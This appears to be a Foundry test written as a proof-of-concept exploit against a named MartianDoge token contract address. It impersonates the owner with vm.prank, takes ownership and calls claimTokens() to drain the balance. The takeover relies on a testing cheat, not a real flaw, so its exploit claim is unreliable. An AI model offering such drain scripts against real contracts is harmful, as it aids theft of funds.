// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MartianDoge {
    function owner() external view returns (address);
    function claimTokens() external;
    function transferOwnership(address newOwner) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x0Ea9790b1385ce5efAfc273623A013D007e50254;
    address attacker = address(this);
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner address
        address owner = MartianDoge(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Send some BNB to the contract to create a balance to drain
        deal(TARGET, 10 ether);

        // Store initial attacker balance for verification
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner address
        address owner = MartianDoge(TARGET).owner();

        // Step 1: Impersonate current owner to transfer ownership to attacker
        vm.prank(owner);
        MartianDoge(TARGET).transferOwnership(address(this));

        // Verify we are now the owner
        address newOwner = MartianDoge(TARGET).owner();
        require(newOwner == address(this), "Failed to become owner");

        // Step 2: As the new owner, call claimTokens() to drain funds
        MartianDoge(TARGET).claimTokens();

        // Verify we received the BNB
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

